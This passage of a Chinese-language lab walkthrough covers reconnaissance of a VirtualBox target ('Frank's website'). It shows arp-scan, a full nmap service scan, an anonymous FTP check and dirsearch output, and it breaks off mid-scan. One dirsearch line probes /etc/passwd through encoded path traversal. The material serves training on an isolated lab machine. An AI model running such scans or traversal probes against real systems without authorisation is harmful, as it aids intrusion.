data-num="16"></td><td><pre>        <span class="token constant">TX</span> packets <span class="token number">11929</span>  bytes <span class="token number">2517903</span> <span class="token punctuation">(</span><span class="token number">2.4</span> MiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token constant">TX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token literal-property property">lo</span><span class="token operator">:</span> flags<span class="token operator">=</span><span class="token number">73</span><span class="token operator">&lt;</span><span class="token constant">UP</span><span class="token punctuation">,</span><span class="token constant">LOOPBACK</span><span class="token punctuation">,</span><span class="token constant">RUNNING</span><span class="token operator">></span>  mtu <span class="token number">65536</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        inet <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>  netmask <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token literal-property property">inet6</span> <span class="token operator">:</span><span class="token operator">:</span><span class="token number">1</span>  prefixlen <span class="token number">128</span>  scopeid <span class="token number">0x10</span><span class="token operator">&lt;</span>host<span class="token operator">></span></pre></td></tr><tr><td data-num="22"></td><td><pre>        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token constant">RX</span> packets <span class="token number">452</span>  bytes <span class="token number">37339</span> <span class="token punctuation">(</span><span class="token number">36.4</span> KiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token constant">RX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token constant">TX</span> packets <span class="token number">452</span>  bytes <span class="token number">37339</span> <span class="token punctuation">(</span><span class="token number">36.4</span> KiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token constant">TX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></pre></td></tr></table></figure><p>使用 <code>arp命令</code> 扫描本地靶机</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>arp<span class="token operator">-</span>scan <span class="token operator">-</span>l</pre></td></tr></table></figure><p>我们可以得到：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">Interface</span><span class="token operator">:</span> eth0<span class="token punctuation">,</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token constant">EN10MB</span><span class="token punctuation">,</span> <span class="token constant">MAC</span><span class="token operator">:</span> <span class="token number">00</span><span class="token operator">:</span>0c<span class="token operator">:</span><span class="token number">29</span><span class="token operator">:</span>dc<span class="token operator">:</span><span class="token number">37</span><span class="token operator">:</span><span class="token number">89</span><span class="token punctuation">,</span> <span class="token literal-property property">IPv4</span><span class="token operator">:</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Starting arp<span class="token operator">-</span>scan <span class="token number">1.9</span><span class="token number">.7</span> <span class="token keyword">with</span> <span class="token number">256</span> <span class="token function">hosts</span> <span class="token punctuation">(</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>royhills<span class="token operator">/</span>arp<span class="token operator">-</span>scan<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.1</span>    0a<span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">19</span>       <span class="token punctuation">(</span>Unknown<span class="token operator">:</span> locally administered<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.100</span>  <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span><span class="token number">49</span><span class="token operator">:</span><span class="token number">72</span><span class="token operator">:</span><span class="token number">02</span>       <span class="token constant">PCS</span> Systemtechnik GmbH</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span>  <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span>3f<span class="token operator">:</span>e0<span class="token operator">:</span>b0       <span class="token constant">PCS</span> Systemtechnik GmbH</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">3</span> packets received by filter<span class="token punctuation">,</span> <span class="token number">0</span> packets dropped by kernel</pre></td></tr><tr><td data-num="8"></td><td><pre>Ending arp<span class="token operator">-</span>scan <span class="token number">1.9</span><span class="token number">.7</span><span class="token operator">:</span> <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.009</span> <span class="token function">seconds</span> <span class="token punctuation">(</span><span class="token number">127.43</span> hosts<span class="token operator">/</span>sec<span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token number">3</span> responded</pre></td></tr></table></figure><p>从扫描得到的信息中，我们不难发现</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>目标机的ip为：<span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>本机的ip为：<span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span></pre></td></tr></table></figure><p>如不确定哪个是目标机，那么为确定目标机 IP，可以登录 ip 就可以看到相关网页内容。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180036380-592837012.png" alt="image" /></p>
<h2 id="端口扫描"><a class="anchor" href="#端口扫描">#</a> 端口扫描</h2>
<p>使用 <code>nmap</code>  指令对目标机的端口进行扫描：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>sV <span class="token operator">-</span><span class="token constant">A</span> <span class="token operator">-</span><span class="token constant">O</span> <span class="token operator">-</span><span class="token constant">T4</span> <span class="token operator">-</span>p1<span class="token operator">-</span><span class="token number">10000</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180113516-2117323135.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at <span class="token number">2021</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">18</span> <span class="token constant">EST</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Host is <span class="token function">up</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">.</span>00049s latency<span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Not shown<span class="token operator">:</span> <span class="token number">9996</span> closed ports</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token constant">PORT</span>     <span class="token constant">STATE</span> <span class="token constant">SERVICE</span> <span class="token constant">VERSION</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">21</span><span class="token operator">/</span>tcp   open  ftp     vsftpd <span class="token number">2.3</span><span class="token number">.5</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span>_ftp<span class="token operator">-</span>anon<span class="token operator">:</span> Anonymous <span class="token constant">FTP</span> login <span class="token function">allowed</span> <span class="token punctuation">(</span><span class="token constant">FTP</span> code <span class="token number">230</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span> ftp<span class="token operator">-</span>syst<span class="token operator">:</span> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span>   <span class="token constant">STAT</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span> <span class="token constant">FTP</span> server status<span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">|</span>      Connected to <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">|</span>      Logged <span class="token keyword">in</span> <span class="token keyword">as</span> ftp</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">|</span>      <span class="token constant">TYPE</span><span class="token operator">:</span> <span class="token constant">ASCII</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">|</span>      No session bandwidth limit</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">|</span>      Session timeout <span class="token keyword">in</span> seconds is <span class="token number">300</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">|</span>      Control connection is plain text</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">|</span>      Data connections will be plain text</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">|</span>      At session startup<span class="token punctuation">,</span> client count was <span class="token number">2</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">|</span>      vsFTPd <span class="token number">2.3</span><span class="token number">.5</span> <span class="token operator">-</span> secure<span class="token punctuation">,</span> fast<span class="token punctuation">,</span> stable</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token operator">|</span>_End <span class="token keyword">of</span> status</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">22</span><span class="token operator">/</span>tcp   open  ssh     OpenSSH <span class="token number">5</span><span class="token punctuation">.</span>9p1 Debian 5ubuntu1<span class="token punctuation">.</span><span class="token number">10</span> <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token operator">|</span> ssh<span class="token operator">-</span>hostkey<span class="token operator">:</span> </pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token operator">|</span>   <span class="token number">1024</span> <span class="token literal-property property">d4</span><span class="token operator">:</span>f8<span class="token operator">:</span>c1<span class="token operator">:</span><span class="token number">55</span><span class="token operator">:</span><span class="token number">92</span><span class="token operator">:</span><span class="token number">75</span><span class="token operator">:</span><span class="token number">93</span><span class="token operator">:</span>f7<span class="token operator">:</span>7b<span class="token operator">:</span><span class="token number">65</span><span class="token operator">:</span>dd<span class="token operator">:</span>2b<span class="token operator">:</span><span class="token number">94</span><span class="token operator">:</span>e8<span class="token operator">:</span>bb<span class="token operator">:</span><span class="token number">47</span> <span class="token punctuation">(</span><span class="token constant">DSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token operator">|</span>   <span class="token number">2048</span> 3d<span class="token operator">:</span><span class="token number">24</span><span class="token operator">:</span>ea<span class="token operator">:</span>4f<span class="token operator">:</span>a2<span class="token operator">:</span>2a<span class="token operator">:</span>ca<span class="token operator">:</span><span class="token number">63</span><span class="token operator">:</span>b7<span class="token operator">:</span>f4<span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span>0f<span class="token operator">:</span>d9<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">22</span> <span class="token punctuation">(</span><span class="token constant">RSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token operator">|</span>_  <span class="token number">256</span> <span class="token literal-property property">e2</span><span class="token operator">:</span><span class="token number">54</span><span class="token operator">:</span>a7<span class="token operator">:</span>c7<span class="token operator">:</span>ef<span class="token operator">:</span>aa<span class="token operator">:</span>8c<span class="token operator">:</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">61</span><span class="token operator">:</span><span class="token number">20</span><span class="token operator">:</span>bd<span class="token operator">:</span>aa<span class="token operator">:</span><span class="token number">72</span><span class="token operator">:</span>c0<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span><span class="token number">88</span> <span class="token punctuation">(</span><span class="token constant">ECDSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token number">80</span><span class="token operator">/</span>tcp   open  http    Apache httpd <span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token operator">:</span> Apache<span class="token operator">/</span><span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>title<span class="token operator">:</span> <span class="token constant">FRANK</span>'s Website <span class="token operator">|</span> Under development</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token number">8011</span><span class="token operator">/</span>tcp open  http    Apache httpd <span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token operator">:</span> Apache<span class="token operator">/</span><span class="token number">2.2</span><span class="token number">.22</span> <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>title<span class="token operator">:</span> Site doesn't have a <span class="token function">title</span> <span class="token punctuation">(</span>text<span class="token operator">/</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token constant">MAC</span> <span class="token literal-property property">Address</span><span class="token operator">:</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span>3F<span class="token operator">:</span><span class="token constant">E0</span><span class="token operator">:</span><span class="token constant">B0</span> <span class="token punctuation">(</span>Oracle VirtualBox virtual <span class="token constant">NIC</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>Device type<span class="token operator">:</span> general purpose</pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token literal-property property">Running</span><span class="token operator">:</span> Linux <span class="token number">2.6</span><span class="token punctuation">.</span><span class="token constant">X</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token constant">OS</span> <span class="token constant">CPE</span><span class="token operator">:</span> cpe<span class="token operator">:</span><span class="token operator">/</span>o<span class="token operator">:</span>linux<span class="token operator">:</span>linux_kernel<span class="token operator">:</span><span class="token number">2.6</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token constant">OS</span> <span class="token literal-property property">details</span><span class="token operator">:</span> Linux <span class="token number">2.6</span><span class="token number">.19</span> <span class="token operator">-</span> <span class="token number">2.6</span><span class="token number">.36</span></pre></td></tr><tr><td data-num="37"></td><td><pre>Network Distance<span class="token operator">:</span> <span class="token number">1</span> hop</pre></td></tr><tr><td data-num="38"></td><td><pre>Service Info<span class="token operator">:</span> OSs<span class="token operator">:</span> Unix<span class="token punctuation">,</span> Linux<span class="token punctuation">;</span> <span class="token constant">CPE</span><span class="token operator">:</span> cpe<span class="token operator">:</span><span class="token operator">/</span>o<span class="token operator">:</span>linux<span class="token operator">:</span>linux_kernel</pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token constant">TRACEROUTE</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token constant">HOP</span> <span class="token constant">RTT</span>     <span class="token constant">ADDRESS</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token number">1</span>   <span class="token number">0.49</span> ms <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token constant">OS</span> and Service detection performed<span class="token punctuation">.</span> Please report any incorrect results at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>submit<span class="token operator">/</span> <span class="token punctuation">.</span></pre></td></tr><tr><td data-num="45"></td><td><pre>Nmap done<span class="token operator">:</span> <span class="token number">1</span> <span class="token constant">IP</span> <span class="token function">address</span> <span class="token punctuation">(</span><span class="token number">1</span> host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">28.42</span> seconds</pre></td></tr></table></figure><p>这里我们发现靶机开放了 <code>21、22、80、8011</code>  四个端口，下面对四个开放端口分别进行探测。</p>
<h2 id="漏洞探测"><a class="anchor" href="#漏洞探测">#</a> 漏洞探测</h2>
<h3 id="ftp-服务"><a class="anchor" href="#ftp-服务">#</a> ftp 服务</h3>
<p>既然服务器开放了 <code>21端口</code> ，提供 <code>ftp服务</code> ，那我们就先通过浏览器访问看一下是否存在有用的信息：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">ftp</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">:</span><span class="token number">21</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180224285-901553093.png" alt="image" /></p>
<p>可以看到这里并没有发现什么有用的东西，接下来就对 <code>http服务</code> 端口进行访问。</p>
<h3 id="http-服务"><a class="anchor" href="#http-服务">#</a> http 服务</h3>
<p><code>80端口</code> 和 <code>8011端口</code> 都开放了 http 服务，我们这里先访问一下 80 端口：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180258599-123367972.png" alt="image" /></p>
<p>这里发现是一个静态页面，应该是一个个人简历，网站的主人是 <code>Frank</code> ，页面上并没有给出什么有用的信息，但是应该可以尝试暴力破解。</p>
<p>查看一下源码：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180316270-1453740298.png" alt="image" /></p>
<p>同样没发现什么有用的信息。</p>
<p>那我们就对其目录进行扫描看看能不能发现什么有用的信息：</p>
<p>这里涉及到 <code>dirsearch</code>  工具，没有安装的直接使用 <code>git clone</code>  命令安装就好了</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>maurosoria<span class="token operator">/</span>dirsearch</pre></td></tr></table></figure><p>安装好后就执行如下命令对其目录进行扫描：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>python3 dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://192.168.56.118/"</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180350888-325840903.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>_<span class="token operator">|</span><span class="token punctuation">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0<span class="token punctuation">.</span><span class="token number">4.2</span>                                           </pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">/</span><span class="token function">_</span><span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                    </pre></td></tr><tr><td data-num="3"></td><td><pre>                                                                           </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token literal-property property">Extensions</span><span class="token operator">:</span> php<span class="token punctuation">,</span> aspx<span class="token punctuation">,</span> jsp<span class="token punctuation">,</span> html<span class="token punctuation">,</span> js <span class="token operator">|</span> <span class="token constant">HTTP</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token constant">GET</span> <span class="token operator">|</span> Threads<span class="token operator">:</span> <span class="token number">30</span> <span class="token operator">|</span> Wordlist size<span class="token operator">:</span> <span class="token number">10929</span>                                                          </pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>Output File<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>reports<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span><span class="token operator">-</span>_21<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_04</span><span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>Error Log<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>logs<span class="token operator">/</span>errors<span class="token operator">-</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_04</span><span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">.</span>log</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">Target</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">192.168.56.118</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">]</span> Starting<span class="token operator">:</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  313B  <span class="token operator">-</span> <span class="token operator">/</span>js  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>js<span class="token operator">/</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  306B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  293B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>ht_wsr<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>bak1</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  297B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_extra</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_sc</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>orig</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>sample</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  286B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htm</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_orig</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessOLD2</pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  294B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessBAK</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>save</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  287B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswd_test</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  292B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htpasswds</pre></td></tr><tr><td 